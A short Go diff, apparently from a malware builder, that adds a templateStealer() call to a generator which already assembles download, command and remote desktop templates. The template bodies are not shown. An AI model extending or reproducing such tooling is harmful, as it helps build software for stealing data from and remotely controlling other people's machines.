@@ -39,6 +39,8 @@ func Generate(cfg Config) (string, error) {
 		"",
 		templateDownload(),
 		"",
+		templateStealer(),
+		"",
 		templateCommands(),
 		"",
 		templateRemoteDesktop(),
